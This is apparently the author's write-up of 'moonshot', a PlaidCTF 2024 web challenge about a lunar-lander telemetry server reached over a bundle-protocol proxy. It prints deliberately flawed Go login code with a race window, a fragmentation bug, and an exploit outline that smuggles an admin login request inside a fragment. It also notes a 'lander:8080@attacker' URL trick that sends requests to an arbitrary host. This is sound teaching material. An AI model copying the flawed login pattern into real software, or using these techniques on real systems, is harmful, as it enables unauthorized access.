# moonshot

![https://plaidctf.com](https://img.shields.io/badge/Event-PlaidCTF%202024-red)
![](https://img.shields.io/badge/Category-web-blue)
![](https://img.shields.io/badge/Author-luke-brightgreen)
![](https://img.shields.io/badge/Testers-bluepichu-blueviolet)
![](https://img.shields.io/badge/Flag-200%20points%2C%202%20solves-orange)

## Flavor Text

> Type. Cosmic Anomaly
>
> Description. A lunar lander on the moon’s surface has stopped responding to commands. Despite efforts to establish communication and retrieve data, the lander is exhibiting bizarre behavior. Aerial imagery reveals no obvious damage or signs of malfunction, adding to the mystery surrounding its change in behavior.
>
> Hypotheses. Extraterrestrial Interference? Just Bad Code?

## About

The premise is that a lunar lander has started malfunctioning on the moon that you have to exploit by somehow becoming admin through the lander's telemetry module. There are earth and moon-based nodes that proxy web traffic over the [bundle protocol](https://datatracker.ietf.org/doc/rfc9171/). Yes, it's silly that the telemetry module is a web server styled with bootstrap, but I really liked the idea of directly visiting sites hosted on other planets with nothing but a browser. I had initially planned to set the problem on Mars, but concluded the several minute delay would be too frustrating.

The [bundle protocol](https://datatracker.ietf.org/doc/rfc9171/) is a delay/disruption tolerant networking spec built on the concept of store-and-forward. Because it doesn't make much sense in a high RTT environment to have the endpoints handle things like transmission. I built the initial version of the problem using [this](https://github.com/dtn7/dtn7-gold) implementation in Golang, which was unfortunately deprecated and archived the week of the CTF. It was definitely not production ready and bundles were frequently not cleaned up or the nodes would start sending bundles in a loop. So, at the last minute I decided to use the team's instancer (thanks @bluepichu) to stand up on-demand instances rather than a single instance.

## Solution

The telemetry module has a flaw that was meant to stand out. When logging in, the username for the session is set without checking the password, then the password is checked, and then the username is cleared if needed. I had intended this to be a fairly obvious entrypoint into the problem. It's a race condition that if won, you can easily become admin, but it's not easy to win because of the jitter set in the docker compose file that makes it very unlikely to make two requests inside of the race window. 25µs accuracy is going to require two requests coming not from the client, but from the server at nearly the exact same time:

```go
user := r.URL.Query().Get("user")
pass := r.URL.Query().Get("pass")
updateSession(session, "user", user, r, w)
// From here -----

password, ok := users[user]
if !ok {
    updateSession(session, "user", "anonymous", r, w)
    http.Error(w, "invalid user", http.StatusUnauthorized)
    return
}

if subtle.ConstantTimeCompare([]byte(pass), []byte(password)) == 0 {
    // To here ------
    // is the race window, which on my machine typically took about 25µs
    updateSession(session, "user", "anonymous", r, w)
    http.Error(w, "invalid password", http.StatusUnauthorized)
    return
}
```

So how can we trigger multiple requests at the same time from the server? There is an additional bug in the fragmentation/reassembly system that sends individual fragments to the bundle processor along with the fully reassembled bundle:

```go
// Every fragment gets sent individually, along with the reassembled bundle.
// This is a bug. Fragments *should* be dropped after reassembly.
for _, f := range append(p.frags[id], reassembled) {
    wg.Add(1)
    go func() {
        if err := p.ProxyBundle(f); err != nil {
            p.log().WithField("error", err).Info("Failed to proxy bundle")
        }
        wg.Done()
    }()
}
```

The part of the proxy that extracts HTTP messages from the bundles would normally fail to parse a fragment because it's not marshalled correctly. But if we take a look at what the bundles/fragments contain, we may see something interesting! First we have to cause a bundle to be fragmented. The max bundle size in our code is set to 4096 bytes, so we'll need a request bigger than that. And we'll need to print out the content of each fragment as it's extracted:

```console
$ curl "http://lander:8080/data?$(python3 -c 'print("A" * 4096)')"

// Reassembled payload:
{"Method":"GET","Status":0,"URL":"http://lander:8080/data?AAA...AAA","Headers":{"Accept":"*/*","Accept-Encoding":"gzip","User-Agent":"curl/8.1.2","X-Forwarded-For":"192.168.65.1","X-Forwarded-Host":"lander:8080","X-Forwarded-Port":"8080","X-Forwarded-Proto":"http","X-Forwarded-Server":"0dd770ceffe3","X-Real-Ip":"192.168.65.1"},"Body":"","Session":""}

// Fragment 1:
{"Method":"GET","Status":0,"URL":"http://lander:8080/data?AAA...AAA

// Fragment 2:
AAA...AAA","Headers":{"Accept":"*/*","Accept-Encoding":"gzip","User-Agent":"curl/8.1.2","X-Forwarded-For":"192.168.65.1","X-Forwarded-Host":"lander:8080","X-Forwarded-Port":"8080","X-Forwarded-Proto":"http","X-Forwarded-Server":"0dd770ceffe3","X-Real-Ip":"192.168.65.1"},"Body":"","Session":""}
```

On their own, the two fragments are not valid JSON and will fail to parse, but we can change that. Notice that the `Headers` key contains valid JSON:

```json
{
  "Accept": "*/*",
  "Accept-Encoding": "gzip",
  "User-Agent": "curl/8.1.2",
  "X-Forwarded-For": "192.168.65.1",
  "X-Forwarded-Host": "lander:8080",
  "X-Forwarded-Port": "8080",
  "X-Forwarded-Proto": "http",
  "X-Forwarded-Server": "0dd770ceffe3",
  "X-Real-Ip": "192.168.65.1"
}
```

The JSON Unmarshaller in Golang will ignore any keys that aren't present in the target struct, so we can add the headers we need to create an entirely new HTTP request struct within the first struct as long as the complete bundle fragment contains valid JSON. This means the URL needs to be padded to push the `Headers` _value_ into the second fragment, starting with the `{`. Then additional padding will need to be added to make the last byte in the fragment `}`. With some math, this results in the solution script at [./solution.py](/solution.py):

```python
headers = {
    "Method": "GET",
    "User-Agent": "a" * PADDING_1,
    "URL": f"{url}/login?user=admin",
    "Session": cookie,
    "Cookie": f"session={cookie}",
}
resp = session.get(
        f"{url}/data?{'b' * PADDING_2}",
        headers={},
    )
```

In only a few seconds we can win the race and get the flag!

```console
attempt 0...
attempt 1...
attempt 2...
{"Temp":23,"Battery":30,"Healthy":false,"Latitude":-43.4,"Longitude":-11.4,"Flag":"PCTF{flag}"}
```

## Issues

One annoying detail that led to this challenge being unsolved by a few teams that had done nearly all the work to solve was that the user's public IP address affects the padding values beacuse of the headers added by Traefik (`X-Real-IP`, etc.), so it's possible to have a solution working locally but fail remotely for apparently no reason.

Also, the challenge infrastructure had a lot of `502 Bad Gateway` errors throughout the competition. The instances were somewhat isolated by docker networks, but didn't account for teams bypassing the `approvedURLs` restriction that limits what can be proxied. Some teams found that you can make requests to `http://lander:8080@attacker` to trigger requests to an arbitrary domain! Oops! I believe this led to the infrastructure issues because teams were hitting other teams instances and the proxy nodes were receiving bundles they didn't know what to do with.

Ultimately, the latter hypothesis proved correct. It was Just Bad Code.

## Build and Run

Set environment variables in a `.env` file:

```
LANDER_SECRET="secret"
LANDER_ADMIN_PASS="pass"
LANDER_FLAG="PCTF{flag}"
```

Set `/etc/hosts`:

```
127.0.0.1 lander
```

Bring up simulator:

```
docker compose up --build
```

Visit:

```
curl http://lander:8080/
```
